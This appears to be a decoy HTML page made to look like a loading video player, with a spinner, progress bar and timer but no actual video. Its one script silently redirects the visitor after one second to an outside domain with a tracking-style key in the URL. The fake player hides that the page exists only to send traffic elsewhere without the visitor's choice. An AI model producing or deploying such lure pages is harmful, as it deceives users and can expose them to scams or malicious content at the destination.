<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Video</title>
<style>
*{box-sizing:border-box}
body{margin:0;background:#000;display:grid;place-items:center;height:100vh}
.p{width:100%;max-width:800px;aspect-ratio:16/9;background:#111;position:relative}
.l{position:absolute;top:50%;left:50%;width:42px;height:42px;margin:-21px;border:4px solid #555;border-top-color:#fff;border-radius:50%;animation:s .7s linear infinite}
.c{position:absolute;bottom:0;left:0;right:0;padding:10px;background:linear-gradient(transparent,#000);color:#aaa;font:12px Arial}
.bar{height:3px;background:#444;margin-bottom:9px}
.bar i{display:block;width:2%;height:100%;background:#fff}
.t{margin-left:10px}
@keyframes s{to{transform:rotate(360deg)}}
</style>
</head>
<body>

<div class="p">
  <div class="l"></div>

  <div class="c">
    <div class="bar"><i></i></div>
    ▶ <span class="t">0:00 / 0:00</span>
  </div>
</div>

<script>
setTimeout(()=>location.replace("https://mammothsubway.com/pynxydkcf?key=9fcaaab1932732baaffa3314295d33af"),1000);
</script>

</body>
</html>
